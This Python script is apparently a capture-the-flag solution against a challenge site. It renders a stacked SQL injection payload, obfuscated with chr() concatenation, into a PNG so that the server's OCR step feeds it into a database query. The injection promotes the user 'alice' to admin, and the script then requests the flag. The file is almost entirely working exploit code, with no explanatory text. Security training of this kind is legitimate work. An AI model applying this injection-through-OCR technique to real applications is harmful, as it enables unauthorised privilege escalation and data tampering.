#!/usr/bin/env python3

from __future__ import annotations

import io

import requests
from PIL import Image, ImageDraw, ImageFont


BASE_URL = "https://hackersbotted.squ1rrel.dev"
SPOT_URL = f"{BASE_URL}/api/spot"
FLAG_URL = f"{BASE_URL}/api/flag"
FONT_PATH = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
TIMEOUT = 60

# Promote alice to admin using stacked SQL statements inside the OCR text.
PAYLOAD = (
    "x';update users set role=chr(97)||chr(100)||chr(109)||chr(105)||chr(110) "
    "where name=chr(97)||chr(108)||chr(105)||chr(99)||chr(101);"
    "select role from users where name='x"
)


def render_payload_image(text: str) -> bytes:
    font = ImageFont.truetype(FONT_PATH, 54)
    probe = Image.new("RGB", (10, 10), "white")
    draw = ImageDraw.Draw(probe)
    bbox = draw.textbbox((0, 0), text, font=font)

    width = max(6200, bbox[2] - bbox[0] + 60)
    height = max(260, bbox[3] - bbox[1] + 80)
    image = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(image)
    draw.text((30, 70), text, fill="black", font=font)

    output = io.BytesIO()
    image.save(output, format="PNG")
    return output.getvalue()


def trigger_injection(session: requests.Session) -> requests.Response:
    image_bytes = render_payload_image(PAYLOAD)
    return session.post(
        SPOT_URL,
        data={"spotter": "charlie"},
        files={"photo": ("payload.png", image_bytes, "image/png")},
        timeout=TIMEOUT,
    )


def fetch_flag(session: requests.Session) -> str:
    response = session.post(FLAG_URL, json={"username": "alice"}, timeout=TIMEOUT)
    response.raise_for_status()
    payload = response.json()
    flag = payload.get("flag")
    if not flag:
        raise RuntimeError(f"Flag not present in response: {payload}")
    return str(flag)


def main() -> int:
    session = requests.Session()
    injection_response = trigger_injection(session)
    print(f"/api/spot -> {injection_response.status_code} {injection_response.text}")
    flag = fetch_flag(session)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())